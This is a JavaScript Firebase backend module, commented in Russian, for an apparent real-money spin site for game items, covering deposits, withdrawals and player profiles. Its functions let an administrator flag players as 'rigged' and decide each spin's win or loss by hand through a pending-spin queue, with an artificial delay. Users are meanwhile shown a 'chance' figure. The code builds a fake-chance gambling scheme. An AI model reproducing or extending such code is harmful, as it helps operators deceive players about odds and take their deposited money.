const FirebaseDB = {
  db: null,
  enabled: false,
  _queueUnsub: null,
  _spinsUnsub: null,
  _riggedUnsub: null,
  _userUnsub: null,

  init() {
    try {
      if (typeof firebase === 'undefined') return false;
      if (typeof firebaseConfig === 'undefined') return false;
      if (!firebaseConfig.apiKey || firebaseConfig.apiKey === 'YOUR_API_KEY') return false;
      if (!firebaseConfig.databaseURL) {
        console.warn('Firebase: добавь databaseURL в firebase-config.js');
        return false;
      }

      if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
      this.db = firebase.database();
      this.enabled = true;
      return true;
    } catch (e) {
      console.warn('Firebase init failed:', e);
      return false;
    }
  },

  _userId(username) {
    return username.toLowerCase().trim().replace(/[.#$[\]]/g, '_');
  },

  _ref(path) {
    return this.db.ref(path);
  },

  _once(path) {
    return new Promise((resolve, reject) => {
      this._ref(path).once('value', snap => resolve(snap.val()), reject);
    });
  },

  _ts() {
    return Date.now();
  },

  _tsVal(n) {
    if (typeof n === 'number') return n;
    if (typeof n === 'string') return new Date(n).getTime() || 0;
    return 0;
  },

  // ─── Подкрутка игроков ───

  async setRigged(username, enabled) {
    if (!this.enabled) throw new Error('Firebase не подключён');
    await this._ref(`riggedPlayers/${this._userId(username)}`).set({
      enabled: !!enabled,
      displayName: username,
      updatedAt: this._ts(),
    });
  },

  async isRigged(username) {
    if (!this.enabled) return false;
    const data = await this._once(`riggedPlayers/${this._userId(username)}`);
    return data?.enabled === true;
  },

  subscribeRiggedPlayers(callback) {
    if (!this.enabled) return () => {};
    const ref = this._ref('riggedPlayers');
    const handler = snap => {
      const val = snap.val() || {};
      callback(Object.entries(val).map(([id, data]) => ({ id, ...data })));
    };
    this._riggedUnsub = () => ref.off('value', handler);
    ref.on('value', handler);
    return this._riggedUnsub;
  },

  // ─── Ожидающие прокрутки ───

  async createPendingSpin(data) {
    if (!this.enabled) throw new Error('Firebase не подключён');
    const ref = this._ref('pendingSpins').push();
    await ref.set({
      username: this._userId(data.displayName || data.username),
      displayName: data.displayName || data.username,
      fromItemUid: data.fromItemUid,
      toBrainrotId: data.toBrainrotId,
      fromName: data.fromName,
      toName: data.toName,
      fromIncome: data.fromIncome ?? null,
      toIncome: data.toIncome ?? null,
      chance: data.chance,
      status: 'waiting',
      createdAt: this._ts(),
    });
    return ref.key;
  },

  waitForSpinResult(spinId, minDelayMs = 5000) {
    if (!this.enabled) return Promise.reject(new Error('Firebase не подключён'));

    return new Promise((resolve, reject) => {
      const started = Date.now();
      let resolved = false;
      const ref = this._ref(`pendingSpins/${spinId}`);

      const timeout = setTimeout(() => {
        if (!resolved) {
          ref.off('value', handler);
          reject(new Error('Таймаут: админ не ответил'));
        }
      }, 120000);

      const handler = snap => {
        if (resolved) return;
        const data = snap.val();
        if (!data || data.status !== 'resolved') return;

        resolved = true;
        clearTimeout(timeout);
        const wait = Math.max(0, minDelayMs - (Date.now() - started));
        setTimeout(() => {
          ref.off('value', handler);
          resolve(data);
        }, wait);
      };

      ref.on('value', handler);
    });
  },

  async resolveSpin(spinId, result) {
    if (!this.enabled) throw new Error('Firebase не подключён');
    await this._ref(`pendingSpins/${spinId}`).update({
      status: 'resolved',
      result,
      won: result === 'win',
      resolvedAt: this._ts(),
    });
  },

  subscribePendingSpins(callback) {
    if (!this.enabled) return () => {};
    const ref = this._ref('pendingSpins');
    const handler = snap => {
      const val = snap.val() || {};
      const items = Object.entries(val)
        .map(([id, data]) => ({ id, ...data }))
        .filter(s => s.status === 'waiting');
      items.sort((a, b) => this._tsVal(b.createdAt) - this._tsVal(a.createdAt));
      callback(items);
    };
    this._spinsUnsub = () => ref.off('value', handler);
    ref.on('value', handler);
    return this._spinsUnsub;
  },

  // ─── Очередь депозитов/выводов ───

  async pushDeposit(req) {
    if (!this.enabled) return;
    await this._ref(`queue/${req.id}`).set({ type: 'deposit', ...req });
  },

  async pushWithdraw(req) {
    if (!this.enabled) return;
    await this._ref(`queue/${req.id}`).set({ type: 'withdraw', ...req });
  },

  async updateQueueItem(id, patch) {
    if (!this.enabled) return;
    await this._ref(`queue/${id}`).update(patch);
  },

  subscribeQueue(callback) {
    if (!this.enabled) return () => {};
    const ref = this._ref('queue');
    const handler = snap => {
      const val = snap.val() || {};
      const deposits = [];
      const withdraws = [];
      Object.entries(val).forEach(([id, item]) => {
        const row = { id, ...item };
        if (row.type === 'deposit' && row.status === 'waiting_admin') deposits.push(row);
        if (row.type === 'withdraw' && row.status === 'pending_admin') withdraws.push(row);
      });
      callback({ deposits, withdraws });
    };
    this._queueUnsub = () => ref.off('value', handler);
    ref.on('value', handler);
    return this._queueUnsub;
  },

  // ─── Профили игроков (инвентарь, история) ───

  _normalizeUser(data) {
    if (!data) return null;
    return {
      balance: data.balance ?? 0,
      inventory: data.inventory ?? [],
      history: data.history ?? [],
      pendingDeposits: data.pendingDeposits ?? [],
      pendingWithdraws: data.pendingWithdraws ?? [],
      displayName: data.displayName || '',
      updatedAt: data.updatedAt || null,
    };
  },

  async getUser(username) {
    if (!this.enabled) return null;
    const data = await this._once(`users/${this._userId(username)}`);
    if (!data) return null;
    return this._normalizeUser(data);
  },

  async saveUser(username, data) {
    if (!this.enabled) return;
    const payload = this._normalizeUser({
      ...data,
      displayName: data.displayName || username,
      updatedAt: data.updatedAt || new Date().toISOString(),
    });
    await this._ref(`users/${this._userId(username)}`).set(payload);
  },

  subscribeUser(username, callback) {
    if (!this.enabled) return () => {};
    const ref = this._ref(`users/${this._userId(username)}`);
    const handler = snap => {
      callback(snap.val() ? this._normalizeUser(snap.val()) : null);
    };
    this._userUnsub = () => ref.off('value', handler);
    ref.on('value', handler);
    return this._userUnsub;
  },
};